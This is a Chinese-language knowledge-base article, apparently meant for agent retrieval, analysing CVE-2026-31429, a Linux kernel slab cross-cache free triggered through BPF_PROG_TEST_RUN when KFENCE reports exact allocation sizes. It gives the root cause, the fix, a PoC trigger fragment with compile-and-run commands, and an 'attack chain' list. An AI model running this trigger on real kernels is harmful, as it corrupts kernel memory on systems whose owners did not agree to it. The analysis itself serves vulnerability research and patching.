---
id: "general/01-kernel/02-slab-cross-cache"
title: "Slab 跨缓存释放：KFENCE 精确大小报告导致 SKB head 释放到错误缓存"
title_en: "Slab Cross-Cache Free: KFENCE Exact Size Report Frees SKB Head into Wrong Cache"
summary: >
  分析 KFENCE 的 kfence_ksize 返回精确大小如何破坏 skb_kfree_head 启发式路由，触发 kmalloc-1k 对象被释放到 skb_small_head_cache，通过 BPF_PROG_TEST_RUN 稳定复现 SLUB 损坏。
summary_en: >
  Examines how KFENCE kfence_ksize returning exact size breaks skb_kfree_head heuristic routing, causing kmalloc-1k objects to be freed into skb_small_head_cache via BPF_PROG_TEST_RUN, producing repeatable SLUB corruption.
board: "general"
category: "01-kernel"
signals:
  - "slab cross-cache"
  - "KFENCE"
  - "skb_small_head_cache"
  - "SLUB corruption"
  - "BPF_PROG_TEST_RUN"
  - "kfence_ksize"
  - "kmem_cache_free mismatch"
mcp_tools:
  - "kb_router"
  - "workspace_write_text"
keywords:
  - "slab allocator"
  - "KFENCE"
  - "CVE-2026-31429"
  - "skb_small_head_cache"
  - "SLUB"
  - "BPF"
  - "kernel memory corruption"
  - "cross-cache free"
difficulty: "advanced"
tags:
  - "kernel-exploitation"
  - "slab"
  - "memory-corruption"
  - "KFENCE"
  - "BPF"
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# Slab 跨缓存释放：KFENCE 精确大小报告导致 SKB head 释放到错误缓存（CVE-2026-31429）

## 1. 受影响版本

```
6.3   ≤ kernel < 6.6.136
6.7   ≤ kernel < 6.12.82
6.13  ≤ kernel < 6.18.23
6.19  ≤ kernel < 6.19.13
7.0-rc1 ≤ kernel ≤ 7.0-rc7
```

漏洞由 `bf9f1baa279f`（*"net: add dedicated kmem_cache for typical/small skb->head"*）在 6.3 内核中引入。修复提交：`0f42e3f4fe2a`。

## 2. 前置条件

| 条件 | 说明 |
|------|------|
| `CONFIG_KFENCE=y` | 必须启用（Ubuntu / Arch / Fedora 默认开启） |
| `CONFIG_BPF_SYSCALL=y` | 大多数发行版默认开启 |
| `CONFIG_SLUB_DEBUG=y` | 可选，观察 `warn_free_bad_obj` |
| `CONFIG_STACKDEPOT=y` | 可选，观察完整内核 splat 级联 |

## 3. 根因：KFENCE 精确大小打破启发式假设

`skb_small_head_cache` 使用非 2 的幂大小（704 字节）以避让通用 kmalloc 桶。`skb_kfree_head()` 通过启发式路由释放：

```c
// 修复前
static void skb_kfree_head(void *head, unsigned int end_offset) {
    if (end_offset == SKB_SMALL_HEAD_HEADROOM)
        kmem_cache_free(net_hotdata.skb_small_head_cache, head);
    else
        kfree(head);
}
```

正常 slab 语义下安全：`ksize()` 返回桶大小（704→1024），永远不会等于 `SKB_SMALL_HEAD_CACHE_SIZE`。

**KFENCE 例外**：`kfence_ksize()` 返回**精确请求大小**而非桶大小。

### 调用链

```
BPF_PROG_TEST_RUN (syscall 321, cmd=10)
  → bpf_prog_test_run_skb()
    → bpf_test_init()
      → kzalloc(704, GFP_USER)   ← KFENCE 拦截，对象来自 kmalloc-1k
        → slab_build_skb(data, NULL, 704)
          → ksize(data) → kfence_ksize() → 返回 704（精确！）
          → skb_end_offset = 704 - 320 = 384 = SKB_SMALL_HEAD_HEADROOM  ← 错误匹配!

[释放路径:]
  → skb_release_data()
    → skb_free_head()
      → skb_kfree_head(head, skb->end)
        → (end_offset == SKB_SMALL_HEAD_HEADROOM) == TRUE
          → kmem_cache_free(skb_small_head_cache, head)  ← 错误！来自 kmalloc-1k！
            → warn_free_bad_obj() → SLUB 损坏
```

### x86_64 关键数值

```
SKB_SMALL_HEAD_CACHE_SIZE  = 704 bytes
sizeof(skb_shared_info)    = 320 bytes
SKB_SMALL_HEAD_HEADROOM    = 704 - 320 = 384
```

当 KFENCE 拦截 704 字节的 `kzalloc()` 时，`kfence_ksize()` 精确返回 704。算术产生 `skb_end_offset = 384 = SKB_SMALL_HEAD_HEADROOM`，满足错误释放条件。

### 修复

```c
// 修复后：始终通用 kfree
static void skb_kfree_head(void *head, unsigned int end_offset) {
    kfree(head);  // 对两种来源都安全
}
```

## 4. PoC 分析

```c
// 3 条 BPF 指令，类型 BPF_PROG_TYPE_SCHED_CLS
static uint8_t bpf_prog_bytes[] = {
    0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // ld_imm64 r0, 0
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // exit
};

// 284 字节 Syzkaller 衍生的包数据，使 bpf_test_init 内部 kzalloc 请求大小 = 704
for (int i = 0; i < 50; i++)
    bpf_run(fd, syz_data, 284, 4, 4);
```

KFENCE 是概率性的，多次运行通常可在 KFENCE pool 耗尽前成功。

## 5. 复现

```bash
# 检查 KFENCE
grep CONFIG_KFENCE /boot/config-$(uname -r)

# 编译 PoC
cd exploit && gcc -O2 -o cve-2026-31429-poc exp.c

# 运行（需 root）
sudo ./cve-2026-31429-poc

# 检查 dmesg
dmesg | grep -E "warn_free_bad_obj|Wrong slab cache"
```

### 预期 dmesg 输出

```
[ 3065.322990] kmem_cache_free(skbuff_small_head, ffff888186d6e000):
                object belongs to different cache kmalloc-1k
[ 3065.323005] WARNING: mm/slub.c:6258 at warn_free_bad_obj+0x91/0xc0
[ 3065.323247] Call Trace:
[ 3065.323267]  skb_free_head+0x1ec/0x290
[ 3065.323308]  bpf_prog_test_run_skb+0x14f8/0x3410
[ 3065.323510]  __sys_bpf+0x769/0x4b60
```

每次触发产生 4 次连续的 kernel splat：`warn_free_bad_obj` → `depot_fetch_stack` → `stack_depot_print` × 2。

## 6. 为什么难以发现

| 因素 | 说明 |
|------|------|
| KFENCE 概率性 | 统计采样，并非每次分配都被拦截 |
| 精确大小匹配 | 请求大小必须恰好等于 704 字节 |
| 唯一路径 | `bpf_test_init` 是唯一通过 kzalloc 分配 704 字节的路径 |
| 静默数据损坏 | 无 `CONFIG_SLUB_DEBUG` 时可能导致无法诊断的内核崩溃 |

## 攻击链

```
1. 确认目标内核版本受影响，且启用了 KFENCE / BPF prog test run 路径
2. 构造会进入 bpf_prog_test_run_skb 的 BPF 触发程序
3. 让 skb head 以 704 字节路径分配，命中 KFENCE 精确大小报告
4. __ksize 返回精确请求大小而非 slab cache 大小，破坏 skb head cache 推断
5. skb_free_head 按错误 cache 释放对象 → warn_free_bad_obj / cross-cache free
6. 通过 dmesg splat 与调用栈确认触发点；无调试配置时关注异常崩溃或静默损坏
7. 对比修复内核，确认 __ksize/KFENCE 路径不再导致错误 cache 释放
```

## Evidence

记录: 内核版本、KFENCE 配置、dmesg splat 完整输出、BPF 程序触发轮次

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按内核 slab / KFENCE 信号搜索 |
| 写分析笔记 | `workspace_write_text` | 记录 dmesg 输出 |

## 参考资料

| 来源 | 链接 |
|------|------|
| Blue Dragon Security PoC | https://github.com/bluedragonsecurity/CVE-2026-31429-POC |
| 主线补丁 | https://git.kernel.org/stable/c/0f42e3f4fe2a58394e37241d02d9ca6ab7b7d516 |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2026-31429 |
| poc-lab 源 | https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-31429%20Slab%20Cross-Cache |
